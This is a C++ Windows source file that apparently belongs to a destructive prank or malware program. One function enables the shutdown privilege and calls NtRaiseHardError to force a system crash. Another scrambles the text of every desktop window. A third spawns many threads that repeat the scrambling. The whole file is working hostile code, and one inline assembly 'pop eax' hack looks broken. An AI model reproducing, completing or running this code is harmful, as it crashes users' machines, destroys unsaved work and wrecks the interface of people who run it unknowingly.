#include "MU.h"

extern "C"
NTSTATUS NTAPI RtlAdjustPrivilege
   (ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrThread,
    PBOOLEAN StatusPointer);

extern "C"
NTSTATUS NTAPI NtRaiseHardError
   (NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ValidResponseOption,
    PULONG Response);


DWORD invokeHardError
    (no_args)
{
    
    BOOLEAN bl;
    unsigned long response;
    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE,   
    true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE,
        0, 0, 0, 6, &response);

    /* If this returns something, we've got a problem. */

    return INVOKE_HARD_ERROR_FAILED;
}


HCRYPTPROV origprov;
int MRandom
    (no_args) 
{
    if (origprov == NULL)
        if (!CryptAcquireContext(&origprov,
            NULL, NULL, PROV_RSA_FULL,
            CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);
    int out;
    CryptGenRandom(origprov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}

BOOL CALLBACK lpEnumFunc
    (HWND a, LPARAM b) {
    LPWSTR wide = (LPWSTR) GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8500);
    if (SendMessageTimeoutW(a, WM_GETTEXT, 8192, (LPARAM)wide, SMTO_ABORTIFHUNG, 100, NULL)) {
        int len = lstrlenW(wide);
        if (len <= 1)
            return TRUE;
        WCHAR c;
        int i, j;
        for (i = 0, j = len - 1; i < j; i++, j--) {
            wide[i] = wide[MRandom() % j];
            for (int subi = 0; subi < j; subi++) {
                c = wide[i + (MRandom() % 10)] + (MRandom() % 5) - (MRandom() % 5);
                wide[MRandom() % j] = c;
            }
        }
        SendMessageTimeoutW(a, WM_SETTEXT, 8192, (LPARAM)wide, SMTO_ABORTIFHUNG, 100, NULL);
    }
    GlobalFree(wide);
    return TRUE;
}


VOID tMemSpamSub
    (no_args)   
{
    int curr = 100;
    while (curr != 0) {
        __asm {
            pop eax
        } // fix dumb err
        EnumChildWindows(GetDesktopWindow(), &lpEnumFunc, NULL);
        curr--;
    }
}

VOID tMemSpam
    (int nThreads)
{
    std::vector<HANDLE> threadHandles;

    while (nThreads != 0) {
        HANDLE handle = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)tMemSpamSub,
            NULL, 0, NULL);
        if (handle != INVALID_HANDLE_VALUE)
            threadHandles.push_back(handle);
        nThreads--;
    }
    
}
